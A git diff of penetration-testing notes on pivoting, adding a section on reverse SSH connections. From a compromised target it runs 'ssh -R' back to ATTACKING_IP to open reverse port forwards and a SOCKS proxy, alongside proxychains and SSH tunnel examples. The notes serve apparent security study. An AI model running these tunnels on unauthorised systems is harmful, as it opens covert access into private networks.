@@ -11,7 +11,7 @@ Works by prepending the command `proxychains` before other commands.
 
 Proxychains configuration file: `/etc/proxychains.conf` (but proxychains will look into working direcotry first)
 
-```
+```bash
 cp /etc/proxychains.conf .
 ```
 
@@ -22,13 +22,49 @@ cp /etc/proxychains.conf .
 Created from our attacking machine, when we have SSH access to the target.
 
 Local port forwarding:
-```
+```bash
 ssh -L LOCAL_LPORT:TARGET_RHOST:TARGET_RPORT USER@TARGET_RHOST -fN
 ```
 
 Dynamic proxy:
-```
+```bash
 ssh -D LOCAL_LPORT USER@TARGET_RHOST -fN
+```
+
+## Reverse Connections
+
+When we have shell, but not a SSH access.
+
+First we need to generate ssh key:
+```bash
+ssh-keygen
+```
+
+Add this line into `authorized_keys` following your generated key:
+```bash
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+```
+
+Check is the SSH server is running on your machine:
+```bash
+sudo systemctl status ssh
+sudo systemctl start ssh
+```
+
+Then connect back with reverse port forward:
+```
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+
+Or create reverse proxy:
+```bash
+ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+
+Closing SSH connections:
+```bash
+ps aux | grep ssh
+sudo kill PID
 ```
 
 ## plink.exe
